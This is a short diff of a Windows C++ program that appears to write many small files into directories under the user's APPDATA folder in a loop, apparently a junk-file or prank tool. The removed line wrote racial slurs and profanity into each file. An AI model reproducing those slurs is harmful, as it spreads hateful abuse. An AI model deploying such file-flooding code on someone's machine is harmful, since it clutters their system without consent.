@@ -31,7 +31,7 @@ string generate_filename(){
 }
 
 
-int main(){
+int generateFiles(){
     
     string appdata = getenv("APPDATA");
     string s, token;
@@ -50,7 +50,7 @@ int main(){
         cout << fulldir << endl;
 
         ofstream MyFile(fulldir);
-        MyFile << "fk ur mother dog cb nigger nigger nigger nigg niggah";
+        MyFile << generate_filename();
         MyFile.close();
         Sleep(10);
     }
